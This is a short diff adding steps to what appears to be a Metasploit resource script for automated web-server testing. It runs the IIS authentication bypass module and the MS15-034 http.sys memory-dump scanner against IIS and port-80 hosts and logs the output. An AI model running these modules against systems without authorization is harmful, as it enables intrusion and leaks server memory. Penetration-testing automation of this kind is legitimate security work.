@@ -334,6 +334,18 @@ hosts -R
 run
 sleep 5
 
+spool /root/output/msf/web.txt
+echo "IIS Auth Bypass"
+use auxiliary/admin/http/iis_auth_bypass
+services -S IIS
+run
+sleep 5
+
+echo "http.sys mem dump ms15-034"
+use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
+services -p 80 -R
+check
+
 spool off
 
 
